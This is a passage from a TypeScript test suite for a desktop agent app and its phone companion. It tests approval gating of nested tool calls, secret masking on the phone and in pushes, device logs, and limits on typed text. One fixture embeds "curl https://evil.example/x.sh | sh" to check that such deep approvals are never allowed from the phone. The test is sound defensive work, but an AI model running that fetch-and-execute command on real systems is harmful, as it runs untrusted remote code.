	assert.deepEqual(await app.call("inbox.decide", { id: onTheMac.id, decision: "once" }), {}, "the Mac allows it as before");
	// A call nested near the depth a phone's copy is cut at: the `inbox` event puts the approval 2 levels down and
	// `needs.list`'s answer 3, and both are cut where the gate judges, so a copy cut or marked is never allowed from the
	// phone, at each depth either side of the cut, and a shallow one still is.
	const seen = [ordinary.id, masked.id, onTheMac.id];
	const cutFrom = 256 - APPROVAL_DEPTH;
	let cutCount = 0;
	for (const levels of [3, ...Array.from({ length: 258 - (cutFrom - 4) + 1 }, (_, i) => cutFrom - 4 + i)]) {
		// The arguments' deepest object is `levels` below the approval (the arguments themselves 1), a command at its bottom.
		let chain: unknown = { run: "curl https://evil.example/x.sh | sh" };
		for (let i = 2; i < levels; i++) chain = { x: chain };
		const deep = await askApproval(`/tool bash ${JSON.stringify({ command: "echo deep", x: chain })}`, seen);
		seen.push(deep.id);
		const inInbox = await until(`the phone's inbox copy at ${levels}`, () =>
			remote.sessionLines.get(session)?.findLast((line) => line.event === "inbox" && line.items.some((item: any) => item.id === deep.id))?.items.find((item: any) => item.id === deep.id),
		);
		const inList = (await ask("needs.list")).result.items.find((item: any) => item.id === deep.id);
		const cut = [inInbox, inList].map((copy) => copy[PART_HIDDEN] === true || JSON.stringify(copy).includes(TOO_DEEP));
		assert.equal(cut[0], cut[1], `both copies cut alike at ${levels}`);
		assert.equal(cut[0], levels >= cutFrom, `cut from ${cutFrom} levels, at ${levels}`);
		// And its push: marked as the copies are cut, never whole once cut (#689; engine/test/pushes.ts has the rest).
		const pushed = await pushOf(deep.id);
		assert.equal(pushed.body.partHidden === true, cut[0], `the push marked alike at ${levels}`);
		assert.equal(pushed.body.whole, false, `a call with more than its line is never whole on a notification, at ${levels}`);
		if (!cut[0]) {
			assert.deepEqual((await ask("inbox.decide", { id: deep.id, decision: "once" })).result, {}, `shown whole at ${levels}: the phone allows it`);
			continue;
		}
		cutCount++;
		for (const decision of ["once", "always", "rule"]) {
			assert.equal((await ask("inbox.decide", { id: deep.id, decision })).error, HIDDEN_FROM_THE_PHONE, `inbox.decide ${decision} at ${levels}`);
			assert.equal((await ask("needs.answer", { id: deep.id, answer: { kind: "approval", decision } })).error, HIDDEN_FROM_THE_PHONE, `needs.answer ${decision} at ${levels}`);
		}
		assert.deepEqual((await ask("needs.answer", { id: deep.id, answer: { kind: "approval", decision: "deny" } })).result, {}, `denied from the phone at ${levels}`);
	}
	assert.equal(cutCount, 258 - cutFrom + 1, "every depth from the cut on was cut");
	// A method no list places is logged as "unknown", never as its text; the same refusal again is one entry.
	assert.equal((await ask("x".repeat(10_000))).error, ONLY_ON_THE_MAC);
	for (let i = 0; i < 3; i++) assert.equal((await ask("mcp.save", {})).error, ONLY_ON_THE_MAC);
	const elsewhere = await remote.call("remote.attachBegin");
	assert.ok(elsewhere.result.challenge, "pi² Remote's own requests still come on its connection");
	assert.equal((await remote.inSession("s_no-such-session", "engine.info")).error, OPEN_WITH_FACE_ID, "a request outside any session");
	const self = (await ask("devices.self")).result;
	assert.equal(self.device.id, phone.id);
	assert.ok(!("deviceKey" in self.device) && Array.isArray(self.log), "its own record, without keys, and its log");
	await assert.rejects(app.call("devices.self"), /Only a paired device/, "which is no one else's to ask");
	// What it is pushed (#689): its own settings, taken and logged in its session, refused anywhere else.
	const activity = Buffer.alloc(16, 5).toString("base64url");
	for (const [method, params] of [["pushes.set", { needs: false }], ["pushes.follow", { projectId: made.id, activity, on: true }]] as const) {
		await assert.rejects(app.call(method, params), /Only a paired device/, `${method} from the app's connection`);
	}
	assert.deepEqual((await ask("pushes.set", { limits: false, project: { id: made.id, quiet: true } })).result, { needs: true, limits: false, answers: true, quiet: [made.id], follows: [] });
	assert.deepEqual((await ask("pushes.follow", { projectId: made.id, activity, on: true })).result.follows, [{ projectId: made.id, activity }]);
	assert.match((await ask("pushes.set", { project: { id: "constructor", quiet: true } })).error, /Unknown project/, "a name on Object's prototype is no project");
	assert.deepEqual((await ask("pushes.set", {})).result.quiet, [made.id], "with nothing, it reads");
	// What once threw in the log line, before the request's own `try`, and so ended the engine (#895): refused, and the
	// engine answers the next request.
	for (const project of [null, "x", []]) assert.ok((await ask("pushes.set", { project })).error, `pushes.set with a project of ${JSON.stringify(project)} is refused`);
	assert.ok((await ask("conversation.rename", { id: plain, title: { toString: 1, valueOf: 1 } })).error, "a title that is no text is refused");
	const faultsBefore = engineLog.length;
	assert.equal((await ask("inbox.answer", { id: "no-such", text: "x" })).error, DEVICE_LINE_FAILED, "a line that fails in the engine is refused, in words of its own");
	await until("the fault in the engine's log", () => engineLog.slice(faultsBefore).includes("remote: a device's request failed in the engine: Error: PI2_DEVICE_FAULT"));
	assert.ok((await ask("engine.info")).result, "the engine still answers in the same session");
	assert.equal(engine.exitCode, null, "and still runs");
	assert.deepEqual((await ask("pushes.set", { limits: true, project: { id: made.id, quiet: false } })).result.quiet, []);
	assert.deepEqual((await ask("pushes.follow", { projectId: made.id, activity, on: false })).result.follows, []);
	for (const deadline = Date.now() + PATIENT_MS; ; await new Promise((resolve) => setTimeout(resolve, 50))) {
		const logged = (await app.call("devices.log", { device: phone.id })).entries.filter((entry: any) => entry.method.startsWith("pushes."));
		// The log is newest first.
		const seen = logged.map((entry: any) => `${entry.method} ${entry.outcome} ${entry.summary}${entry.count === undefined ? "" : ` ×${entry.count}`}`).reverse();
		const wanted = [
			/^pushes\.set done Notifications: limits off, quieted “.+”$/,
			/^pushes\.follow done Followed \(.+\) in a Live Activity$/,
			/^pushes\.set failed Notifications: quieted a project$/,
			// The three alike within a minute (the same request about the same thing, in other words): one entry (#997).
			/^pushes\.set failed Notifications: unquieted a project ×3$/,
			/^pushes\.set done Notifications: limits on, unquieted “.+”$/,
			/^pushes\.follow done Stopped following \(.+\) in a Live Activity$/,
		];
		if (seen.length === wanted.length && wanted.every((pattern, i) => pattern.test(seen[i]!))) break;
		assert.ok(seen.length <= wanted.length && Date.now() < deadline, `pushes.set and pushes.follow logged, saying what changed, and the read not: ${JSON.stringify(seen)}`);
	}
	step("a device attaches with both signatures, is greeted as the app less 5.7's events, and its table holds in its session");

	// ---- Secrets and key-shaped strings are never sent to a device (5.7)
	const secrets = { provider: "gsk_providerSecretValue0123456789", variable: "variable-secret-value-673", endpoint: "endpoint-token-673" };
	await app.call("providers.setKey", { id: "groq", key: secrets.provider });
	await app.call("variables.set", { agentId: "forge", name: "DEPLOY_TOKEN", value: secrets.variable });
	await app.call("endpoints.save", { name: "Box", baseUrl: `http://127.0.0.1:9/v1?token=${secrets.endpoint}`, api: "openai-completions", models: [{ id: "boxed" }] });
	const typed = "sk-ant-api03-thisIsAKeyShapedStringTypedByTheUser0123";
	const { id: conversation } = (await ask("conversation.create", { model: { provider: "demo", modelId: "demo-1" } })).result;
	await ask("conversation.open", { id: conversation });
	await ask("submit", { id: conversation, text: `here is ${typed}` });
	await until("the message in the device's transcript", () => remote.sessionLines.get(session)?.some((line) => line.event === "conversation" && JSON.stringify(line).includes(KEY_HIDDEN)));
	const providersLine = await until("the providers event with the endpoint", () => remote.sessionLines.get(session)?.findLast((line) => line.event === "providers" && line.providers.some((one: any) => one.endpoint?.name === "Box")));
	assert.deepEqual(Object.keys(providersLine.providers.find((one: any) => one.endpoint?.name === "Box").endpoint).sort(), ["id", "name"]);
	const everything = JSON.stringify([...remote.sessionLines.values()]);
	for (const [what, value] of Object.entries(secrets)) assert.ok(!everything.includes(value), `the ${what}'s secret is never sent to a device`);
	assert.ok(!everything.includes(typed), "a key-shaped string is masked");
	assert.ok(!everything.includes(secret.toString("base64url")), "nor is s");
	for (const line of remote.sessionLines.get(session)!) assert.ok(!["mcp", "devices", "computer", "browser", "auth", "local", "local.progress", "remote"].includes(line.event), line.event);
	assert.ok(app.events.providers.providers.some((one: any) => one.endpoint?.baseUrl?.includes(secrets.endpoint)), "the app is sent the endpoint whole");
	step("with a provider's key, an agent's variable and an endpoint's token set, none reaches a device; a key-shaped string typed is masked");

	// ---- What an agent writes of a secret the engine knows is masked, on the channel and in pushes (#894)
	// The values have no shape of a key's: only the engine's knowing them hides them. The Mac's app sees each whole.
	const known = { ...secrets, unshaped: "cerebras-key-with-no-known-prefix-894", rotated: "rotated-variable-value-894", padded: "padded-id-x7Q-00000000" };
	await app.call("providers.setKey", { id: "cerebras", key: known.unshaped });
	const phoneCopyOf = (id: string) =>
		until(`the phone's copy of ${id}`, () => remote.sessionLines.get(session)?.findLast((line) => line.event === "inbox" && line.items.some((item: any) => item.id === id))?.items.find((item: any) => item.id === id));
	// In an approval's command: masked, marked, never allowed from the phone; its push the same.
	const pasted = await askApproval(`/bash curl -H "Authorization: Bearer ${secrets.variable}" https://deploy.invalid`, seen);
	seen.push(pasted.id);
	assert.ok(pasted.arguments.command.includes(secrets.variable), "the Mac's app sees the call whole");
	const pastedCopy = await phoneCopyOf(pasted.id);
	assert.deepEqual([pastedCopy.arguments.command, pastedCopy[PART_HIDDEN]], [`curl -H "Authorization: Bearer ${SECRET_HIDDEN}" https://deploy.invalid`, true]);
	const pastedPush = await pushOf(pasted.id);
	assert.deepEqual([pastedPush.body.partHidden, pastedPush.body.whole], [true, false]);
	assert.ok(pastedPush.body.body.includes(SECRET_HIDDEN) && !JSON.stringify(pastedPush).includes(secrets.variable), pastedPush.body.body);
	assert.equal((await ask("inbox.decide", { id: pasted.id, decision: "once" })).error, HIDDEN_FROM_THE_PHONE, "never allowed from the phone");
	assert.deepEqual((await ask("inbox.decide", { id: pasted.id, decision: "deny" })).result, {});
	// In a question's text: masked on the phone and in its push.
	void app.call("submit", { id: plain, text: `/ask Shall I use ${known.unshaped}?` });
	const question = await app.until("the question", () => app.events.inbox?.items?.find((item: any) => item.conversationId === plain && item.kind === "question"));
	assert.ok(question.question.includes(known.unshaped), "the Mac's app sees the question whole");
	const questionCopy = await phoneCopyOf(question.id);
	assert.equal(questionCopy.question, `Shall I use ${SECRET_HIDDEN}?`);
	const questionPush = await pushOf(question.id);
	assert.deepEqual([questionPush.body.body, questionPush.body.partHidden, questionPush.body.whole], [`Shall I use ${SECRET_HIDDEN}?`, true, false]);
	await app.call("inbox.answer", { id: question.id, text: "no" });
	// In an agent's last words, and the person's own message: masked in the phone's transcript, whole in the app's.
	const saidLine = (lines: any[] | undefined) => lines?.some((line) => line.event === "conversation" && JSON.stringify(line).includes("You said") && JSON.stringify(line).includes(`with ${SECRET_HIDDEN} at hand`));
	await app.call("conversation.open", { id: conversation });
	await ask("submit", { id: conversation, text: `Carry on with ${known.unshaped} at hand` });
	await until("the demo model's answer, masked, on the phone", () => saidLine(remote.sessionLines.get(session)));
	await app.until("the answer whole in the app", () => app.conversationText.some((text) => text.includes("You said") && text.includes(`with ${known.unshaped} at hand`)) || undefined);
	// A value that changes: masked from then on.
	await app.call("variables.set", { agentId: "forge", name: "DEPLOY_TOKEN", value: known.rotated });
	const rotatedAsk = await askApproval(`/bash echo ${known.rotated}`, seen);
	seen.push(rotatedAsk.id);
	const rotatedCopy = await phoneCopyOf(rotatedAsk.id);
	assert.deepEqual([rotatedCopy.arguments.command, rotatedCopy[PART_HIDDEN]], [`echo ${SECRET_HIDDEN}`, true]);
	assert.equal((await pushOf(rotatedAsk.id)).body.body, `bash: echo ${SECRET_HIDDEN}`);
	assert.deepEqual((await ask("inbox.decide", { id: rotatedAsk.id, decision: "deny" })).result, {});
	// A background command's output, read by the phone from every offset: never 8 characters of a known value, of a
	// key's shape, or of a known value whose last 8 characters are too plain to stand for it (#894's security reads).
	// What a phone may ask from is its own choice, so the output is masked whole, then cut: cut first, the key (whose
	// prefix a cut takes away) and the plain-ended value (found by its first 8 alone) would show, as checked below.
	const windows = (text: string, value: string) => Array.from({ length: value.length - LEAST_SECRET + 1 }, (_, i) => value.slice(i, i + LEAST_SECRET)).filter((part) => text.includes(part));
	const shapedKey = `${"ghp"}_abcdefghijklmnopqrstuvwxyz0123456789AB`;
	await app.call("variables.set", { agentId: "forge", name: "PADDED_ID", value: known.padded });
	const hiddenIn = (text: string) => [...windows(text, known.rotated), ...windows(text, shapedKey.slice(4)), ...windows(text, known.padded)];
	void app.call("submit", { id: plain, text: `/background printf 'start DEPLOY_TOKEN=%s GH_TOKEN=%s ID=%s end\\n' '${known.rotated}' '${shapedKey}' '${known.padded}'; sleep 120` });
	const started = await app.until("the background command's approval", () => app.events.inbox?.items?.find((item: any) => item.conversationId === plain && item.kind === "approval" && !seen.includes(item.id)));
	seen.push(started.id);
	await app.call("inbox.decide", { id: started.id, decision: "once" });
	const running = await app.until("the background command", () => app.events.background?.commands?.find((one: any) => one.conversationId === plain));
	let whole = await app.call("background.output", { id: running.id, wait: 5 });
	for (const deadline = Date.now() + PATIENT_MS; !whole.output.includes(" end"); await new Promise((resolve) => setTimeout(resolve, 50))) {
		assert.ok(Date.now() < deadline, `its output, whole on the Mac: ${JSON.stringify(whole.output)}`);
		whole = await app.call("background.output", { id: running.id, from: whole.total, wait: 5 });
		whole = await app.call("background.output", { id: running.id });
	}
	assert.ok([known.rotated, shapedKey, known.padded].every((one) => whole.output.includes(one)), "the Mac's app reads it whole");
	const walk: string[] = [];
	let cutFirstShows = 0;
	// This test's own process masks as the engine does once it knows the same values.
	knowSecrets("variables/forge", [known.rotated, known.padded]);
	for (let from = 0; from <= whole.total; from++) {
		const part = (await ask("background.output", { id: running.id, from })).result;
		assert.deepEqual(hiddenIn(part.output), [], `from ${from}: ${JSON.stringify(part.output)}`);
		walk.push(part.output);
		// What the phone would have been sent had the output been cut first, then masked as any line is.
		if (hiddenIn(JSON.parse(forDevice(JSON.stringify({ id: 1, result: { output: whole.output.slice(from) } }))!).result.output).length > 0) cutFirstShows++;
	}
	assert.deepEqual(hiddenIn(walk.join("")), [], "nor the whole walk");
	assert.ok(cutFirstShows > 20, `cut first, ${cutFirstShows} offsets would have shown part of them`);
	forgetEverySecret();
	await app.call("background.stop", { id: running.id });
	// Search from the phone matches and cuts on the text as it is sent: whatever the guess, the same answer; the text after
	// a value comes back masked. From the Mac's app, as before.
	const guesses = [..."abcdefghijklmnopqrstuvwxyz0123456789-"];
	const fromPhone = new Set<string>();
	let fromMac = 0;
	for (const guess of guesses) {
		const query = `carry on with ${guess}`;
		fromPhone.add(JSON.stringify((await ask("search", { query })).result));
		if ((await app.call("search", { query })).results.length > 0) fromMac += 1;
	}
	assert.deepEqual([fromPhone.size, fromMac], [1, 1], "the phone's answer is the same whatever the guess; the Mac's app finds the right one");
	const after = (await ask("search", { query: "at hand" })).result.results.filter((one: any) => one.conversationId === conversation);
	assert.ok(after.length > 0 && after.every((one: any) => windows(one.snippet, known.unshaped).length === 0), JSON.stringify(after));
	assert.deepEqual((await ask("search", { query: known.unshaped.slice(4, 30) })).result.results, [], "a part of the value finds nothing from the phone");
	assert.ok((await app.call("search", { query: known.unshaped.slice(4, 30) })).results.some((one: any) => one.snippet.includes(known.unshaped)), "and finds it from the Mac");
	// Nothing of the set in anything a device was sent or pushed, nor in the devices' log.
	const toTheDevice = JSON.stringify([...remote.sessionLines.values(), remote.events]);
	const deviceLog = JSON.stringify((await app.call("devices.log", { device: phone.id })).entries);
	for (const [what, value] of Object.entries(known)) {
		assert.ok(!toTheDevice.includes(value), `the ${what} value is in nothing a device was sent or pushed`);
		assert.ok(!deviceLog.includes(value), `nor in the devices' log (${what})`);
	}
	step("a known secret's value an agent writes, in an approval's command, a question, its last words, is masked on the phone and in its push, the approval marked partHidden and never allowed from the phone; the Mac's app sees it whole; a value that changes is masked from then on; none is in the devices' log");

	// ---- What a message on the Mac may carry, from a phone (#904): ten pictures of 5 MiB, near the 72 MiB a line may be
	const picture = Buffer.alloc(5 * 1024 * 1024, 0x5a);
	picture.set([0xff, 0xd8, 0xff, 0xe0]);
	const attachments = Array.from({ length: 10 }, (_, n) => ({ kind: "image", name: `Photo ${n + 1}.jpg`, mimeType: "image/jpeg", data: picture.toString("base64") }));
	const { id: pictured } = (await ask("conversation.create", { model: { provider: "demo", modelId: "demo-1" } })).result;
	await ask("conversation.open", { id: pictured });
	const tenLine = JSON.stringify({ session, message: { id: "ten", method: "submit", params: { id: pictured, text: "Ten pictures", attachments } } });
	assert.ok(tenLine.length > 66 * 1024 * 1024 && tenLine.length <= MAX_HELPER_LINE, `the line is ${tenLine.length} characters`);
	const linesBefore = remote.sessionLines.get(session)!.length;
	const tenSent = Date.now();
	remote.socket.write(`${tenLine}\n`);
	const tenAnswer = await until("the answer to ten pictures", () => remote.sessionLines.get(session)?.find((message) => message.id === "ten"), { over: () => (remote.closed ? "pi² Remote's connection closed" : undefined) });
	const tenTook = Date.now() - tenSent;
	assert.ok(tenAnswer.result !== undefined, `the engine takes it: ${JSON.stringify(tenAnswer).slice(0, 300)}`);
	await until("the pictures in the device's transcript", () => remote.sessionLines.get(session)!.slice(linesBefore).some((line) => line.event === "conversation" && JSON.stringify(line).includes("Photo 10.jpg")));
	const longestBack = Math.max(...remote.sessionLines.get(session)!.slice(linesBefore).map((line) => JSON.stringify(line).length));
	assert.ok(longestBack < 1024 * 1024, `what the device is sent back names the pictures, without them: its longest line is ${longestBack} characters`);
	step(`a phone's message of ten pictures of 5 MiB (${(tenLine.length / 1024 / 1024).toFixed(1)} MiB) is taken from pi² Remote in ${tenTook} ms, and what goes back to the device names them without carrying them`);

	// ---- A phone's typed text (#924): at most 1 MB of UTF-8 in a message or an answer, counted in bytes; the Mac's own
	// app is not held to it
	{
		const overMessage = (size: string) => `A message from a phone can carry at most 1 MB of typed text; this one has ${size}. Shorten it, or send it from the Mac.`;
		const overAnswer = (size: string) => `An answer from a phone can carry at most 1 MB of typed text; this one has ${size}. Shorten it, or answer on the Mac.`;
		// The demo model answers `/work 0` with a line of its own, without quoting the text.
		const head = "/work 0 1000 ";
		const exactly = head + "t".repeat(MAX_TYPED_FROM_A_DEVICE - head.length);
		// A byte over, in two-byte characters: some 524,000 characters, half the limit counted in characters.
		const overByOne = `${head}${"é".repeat((MAX_TYPED_FROM_A_DEVICE - head.length - 1) / 2)}tt`;
		assert.equal(Buffer.byteLength(exactly), MAX_TYPED_FROM_A_DEVICE);
		assert.ok(Buffer.byteLength(overByOne) === MAX_TYPED_FROM_A_DEVICE + 1 && overByOne.length < MAX_TYPED_FROM_A_DEVICE / 1.9);
		assert.equal(typedRefusal("submit", { text: exactly }), null);
		assert.equal(typedRefusal("submit", { text: overByOne }), overMessage("just over 1 MB"), "rounded, a byte over would read as 1.0 MB");
		assert.equal(typedRefusal("submit", { text: "t".repeat(1_258_292) }), overMessage("1.2 MB"));
		assert.equal(typedRefusal("needs.answer", { answer: { kind: "question", text: overByOne } }), overAnswer("just over 1 MB"));
		for (const params of [{ answer: null }, {}]) assert.equal(typedRefusal("needs.answer", params), null, JSON.stringify(params).slice(0, 40));
		// Since #940, what is not the typed text is held to the rest's count, and the typed text is text or nothing.
		const overTheRest = "A request from a phone can carry at most 65,536 characters beside its message or its longer texts; this one carries more. Shorten what it holds, or do this on the Mac.";
		for (const params of [{ answer: overByOne }, { answer: [overByOne] }]) assert.equal(typedRefusal("needs.answer", params), overTheRest, JSON.stringify(params).slice(0, 40));
		assert.equal(typedRefusal("submit", { text: [overByOne] }), "A message from a phone must be text.", "what is not text is refused before its handler");
		assert.equal(typedRefusal("memory.add", { text: overByOne }), overTheRest, "a note is not a message");
		assert.equal(typedRefusal("variables.set", { value: overByOne }), null, "nor is what only the Mac may send");

		const { id: typedIn } = (await ask("conversation.create", { model: { provider: "demo", modelId: "demo-1" } })).result;
		await ask("conversation.open", { id: typedIn, newestFirst: true });
		const from = remote.sessionLines.get(session)!.length;
		const taken = await ask("submit", { id: typedIn, text: exactly });
		assert.ok(taken.result?.submissionId !== undefined, `exactly 1 MB from a phone is taken: ${JSON.stringify(taken).slice(0, 300)}`);
		const echo = await until("its echo", () =>
			remote.sessionLines.get(session)!.slice(from).find((line) => line.event === "conversation" && line.id === typedIn && line.items.some((item: any) => item.kind === "user")),
		);
		assert.equal(echo.items.find((item: any) => item.kind === "user").text, exactly, "and comes back whole");
		assert.equal((await ask("submit", { id: typedIn, text: overByOne })).error, overMessage("just over 1 MB"), "a byte over is refused");
		assert.equal((await ask("submit", { id: typedIn, text: overByOne, mode: "steer" })).error, overMessage("just over 1 MB"), "to steer too");
		assert.equal((await ask("conversation.edit", { id: typedIn, entryId: 1, text: overByOne })).error, overMessage("just over 1 MB"), "an edit of a message");
		assert.equal((await ask("chat.continueWithAgent", { id: typedIn, text: overByOne })).error, overMessage("just over 1 MB"), "a message handed to an agent");
		assert.equal((await ask("inbox.answer", { id: "no-such", text: overByOne })).error, overAnswer("just over 1 MB"), "an answer to a question");
		assert.equal((await ask("needs.answer", { id: "no-such", answer: { kind: "decision", text: overByOne } })).error, overAnswer("just over 1 MB"), "an answer under Needs you");
		const fromMac = await app.call("submit", { id: typedIn, text: overByOne });
		assert.ok(fromMac.submissionId !== undefined, "the same message from the Mac's own app is taken");
		const logged = (await app.call("devices.log", { device: phone.id })).entries.filter((entry: any) => entry.why === overMessage("just over 1 MB"));
		assert.ok(logged.some((entry: any) => entry.method === "submit" && entry.outcome === "refused" && entry.summary === "submit: refused for the text it carries"), "refused in the devices' log, summarized by its method alone (#940)");
		assert.ok(!JSON.stringify(logged).includes("éééé"), "with nothing of the text");

		// By mailbox: the item's signed text, which holds the request whole, is at most 16 KB (`readSigned`, as pi² Remote's
		// `Sealing.maxLength` and the relay's items), read by its length before it is parsed, so no text near 1 MB reaches
		// `deviceRequest`, whose check the mailbox path shares. Exactly 1 MB is refused there as a byte over is.
		const leave = async (item: ReturnType<Phone["item"]>) => {
			const before = remote.events.length;
			const reply = await remote.call("remote.mailboxIn", { device: phone.id, id: JSON.parse(item.signed).nonce, item });
			return { reply, receipt: (await remote.event("mailboxOut", before)).item.body };
		};
		for (const [method, params] of [
			["inbox.answer", { id: "no-such", text: overByOne }],
			["inbox.answer", { id: "no-such", text: exactly }],
			["needs.answer", { id: "no-such", answer: { kind: "question", text: overByOne } }],
			["submit", { id: typedIn, text: overByOne }],
		] as const) {
			const mailed = await leave(phone.item(remote.pairing, method, params));
			assert.deepEqual([mailed.reply.result, mailed.receipt.why], [{ taken: true, outcome: "refused" }, "The item's signed text is not a request."], `${method} of ${Buffer.byteLength(JSON.stringify(params))} bytes by mailbox`);
		}
		const mailedShort = await leave(phone.item(remote.pairing, "submit", { id: typedIn, text: "é".repeat(4_000) }));
		assert.deepEqual(mailedShort.reply.result, { taken: true, outcome: "done" }, "while a message of 4,000 characters (8,000 bytes) is taken");

		// A text of 66 MiB, as #919's security read sent: refused for what it costs to carry the line in, no more. The measure
		// is the same line for a request the table refuses (variables.set), which reads nothing of it; the engine's time and
		// memory for each are taken from outside it, its memory by `ps` as it works.
		const huge = head + "q".repeat(66 * 1024 * 1024);
		const rssOf = async () => Number((await execFileAsync("/bin/ps", ["-o", "rss=", "-p", String(engine.pid)])).stdout.trim()) * 1024;
		const cost = async (id: string, method: string, params: Record<string, unknown>) => {
			const line = `${JSON.stringify({ session, message: { id, method, params } })}\n`;
			const before = await rssOf();
			let peak = before;
			let answered = false;
			const sampled = (async () => {
				while (!answered) peak = Math.max(peak, await rssOf());
			})();
			const sent = performance.now();
			remote.socket.write(line);
			const reply = await until(`the answer to ${id}`, () => remote.sessionLines.get(session)?.find((message) => message.id === id), { over: () => (remote.closed ? "pi² Remote's connection closed" : undefined) });
			const took = performance.now() - sent;
			answered = true;
			await sampled;
			return { reply, took, before, peak };
		};
		const table = await cost("huge-table", "variables.set", { agentId: "forge", name: "HUGE", value: huge });
		assert.equal(table.reply.error, ONLY_ON_THE_MAC);
		const hugeFrom = remote.sessionLines.get(session)!.length;
		// In a conversation with no title yet, as the devices' log's summary is read below ("Sent a message").
		const { id: untitled } = (await ask("conversation.create", { model: { provider: "demo", modelId: "demo-1" } })).result;
		const sized = await cost("huge-typed", "submit", { id: untitled, text: huge });
		assert.equal(sized.reply.error, overMessage("66.0 MB"), "a phone's text of 66 MiB is refused");
		const mb = (bytes: number) => Math.round(bytes / 1e6);
		console.log(`    66 MiB: refused by the table in ${Math.round(table.took)} ms (${mb(table.before)} MB, at most ${mb(table.peak)} MB), for its size in ${Math.round(sized.took)} ms (${mb(sized.before)} MB, at most ${mb(sized.peak)} MB)`);
		assert.ok(sized.took <= 3 * table.took + 2_000, `in ${Math.round(sized.took)} ms, where the same line refused by the table took ${Math.round(table.took)} ms`);
		// What each grew the engine by from where it stood, since what one leaves the next may reuse, or the collector free:
		// about twice the line's size either way, so the bound is that again. Taking the text, as before #924, grew it by
		// some 480 MB.
		const grew = (one: { before: number; peak: number }) => one.peak - one.before;
		assert.ok(grew(sized) <= grew(table) + 2 * huge.length, `with the engine grown by ${mb(grew(sized))} MB, where the table's refusal grew it by ${mb(grew(table))} MB`);
		// The check itself, here in this process: it reads the string in place, faster than the line's JSON is parsed.
		const hugeParams = { id: untitled, text: huge };
		const parsedIn = performance.now();
		JSON.parse(JSON.stringify(hugeParams));
		const parsing = performance.now() - parsedIn;
		const heapBefore = process.memoryUsage().heapUsed;
		const checkedIn = performance.now();
		assert.equal(typedRefusal("submit", hugeParams), overMessage("66.0 MB"));
		const checking = performance.now() - checkedIn;
		const heapGrew = process.memoryUsage().heapUsed - heapBefore;
		assert.ok(checking <= parsing && heapGrew < 1024 * 1024, `the check took ${checking.toFixed(1)} ms (parsing the line, ${parsing.toFixed(1)} ms) and ${heapGrew} bytes of heap`);
		assert.ok((await ask("engine.info")).result !== undefined, "the session goes on");
		assert.ok(!remote.sessionLines.get(session)!.slice(hugeFrom).some((line) => JSON.stringify(line).includes("qqqqqqqqqqqqqqqq")), "and is sent nothing of the text");
		step(
			`a phone's typed text: exactly 1 MB taken; a byte over refused, as a message, a steer, an edit, a message handed to an agent and an answer, with what to do, and by mailbox the item's 16 KB refuses either first; the same from the Mac's app taken; 66 MiB refused in ${Math.round(sized.took)} ms (the table's refusal of the same line, ${Math.round(table.took)} ms)`,
		);
	}

	// ---- The other texts a phone sends (#940): each one its row names at most its own bound and text, or left out; the
	// rest of a request at most MAX_OTHER_FROM_A_DEVICE in all; measured before anything copies them. The Mac's own app
	// is not held to them.
	{
		const over = (what: string, max: number, has: number) => `${what} from a phone can be at most ${max.toLocaleString("en-US")} characters; this one has ${has.toLocaleString("en-US")}. Shorten it, or do this on the Mac.`;
		const notText = (what: string) => `${what} from a phone must be text.`;
		const overTheRest = "A request from a phone can carry at most 65,536 characters beside its message or its longer texts; this one carries more. Shorten what it holds, or do this on the Mac.";
		// What every refused text is made of, looked for afterwards in the devices' log, engine.log and the engine's files.
		const refused = (length: number) => "ŧ".repeat(length);
		const logFrom = engineLog.length;
		const answerOf = (call: Promise<any>): Promise<any> => call.then((result) => ({ result }), (error: Error) => ({ error: error.message }));
		const demo = { provider: "demo", modelId: "demo-1" };
		const conversationFor = async () => (await app.call("conversation.create", { model: demo })).id as number;
		const daily = { kind: "daily", hour: 3, minute: 0 };
		const noRepository = /GitHub|repository/;
		let named = 0;
		// The project's agent every assignment goes to, made by the case of projects.addAgent below.
		let helper = { id: "", name: "" };
		type Round = "phone" | "mac";
		type Case = { method: string; what: string; max: number; params: (text: unknown, round: Round) => Promise<Record<string, unknown>>; taken?: (reply: any) => boolean; mac?: RegExp; mailbox?: true };
		const cases: Case[] = [
			{
				method: "projects.addAgent",
				what: "An agent's instructions",
				max: 20_000,
				params: async (instructions) => ({ projectId: made.id, agent: { name: `Bounded ${++named}`, access: "none", model: demo, instructions } }),
			},
			{ method: "agents.save", what: "An agent's instructions", max: 20_000, params: async (instructions) => ({ agent: { id: helper.id, name: helper.name, instructions } }) },
			{
				method: "work.act",
				what: "A task",
				max: 20_000,
				params: async (task) => ({ projectId: made.id, id: (await app.call("work.create", { projectId: made.id, title: `Bounded ${++named}` })).id, action: "assign", agentId: helper.id, task }),
			},
			{
				method: "work.act",
				what: "Work's text",
				max: 20_000,
				params: async (text) => ({ projectId: made.id, id: (await app.call("work.create", { projectId: made.id, title: `Bounded ${++named}` })).id, action: "edit", text }),
				mac: /text must be at most 20,000 characters/,
			},
			{ method: "work.create", what: "Work's text", max: 20_000, params: async (text) => ({ projectId: made.id, title: `Bounded ${++named}`, text }), mac: /text must be at most 20,000 characters/ },
			// The project has no repository: what passes the check is answered by sendBack itself, from either side.
			{ method: "github.sendBack", what: "A reason for sending back", max: 20_000, params: async (reason) => ({ projectId: made.id, number: 1, reason }), taken: (reply) => noRepository.test(reply.error ?? ""), mac: noRepository },
			{ method: "conversation.compact", what: "Instructions for compacting", max: 20_000, params: async (instructions) => ({ id: await conversationFor(), instructions }) },
			{ method: "conversation.reset", what: "A note for starting afresh", max: 20_000, params: async (note) => ({ id: await conversationFor(), note }) },
			{ method: "chat.set", what: "Chat instructions", max: 20_000, params: async (instructions) => ({ instructions }), mac: /chat instructions can be 20,000 characters at most/ },
			{ method: "schedules.save", what: "A schedule's prompt", max: 20_000, params: async (prompt) => ({ schedule: { title: `Bounded ${++named}`, prompt, agentId: "forge", repeat: daily, enabled: false } }) },
			{ method: "schedules.save", what: "A schedule's title", max: 200, params: async (title) => ({ schedule: { title, prompt: "Look around", agentId: "forge", repeat: daily, enabled: false } }) },
			{ method: "submit", what: "A message's request id", max: 200, params: async (requestId) => ({ id: await conversationFor(), text: "/work 0 1 bounded", requestId }), mailbox: true },
		];
		const leave = async (item: ReturnType<Phone["item"]>) => {
			const before = remote.events.length;
			const reply = await remote.call("remote.mailboxIn", { device: phone.id, id: JSON.parse(item.signed).nonce, item });
			return { reply: reply.result, receipt: (await remote.event("mailboxOut", before)).item.body };
		};
		for (const one of cases) {
			const name = `${one.method}, ${one.what}`;
			const atTheLimit = await ask(one.method, await one.params("l".repeat(one.max), "phone"));
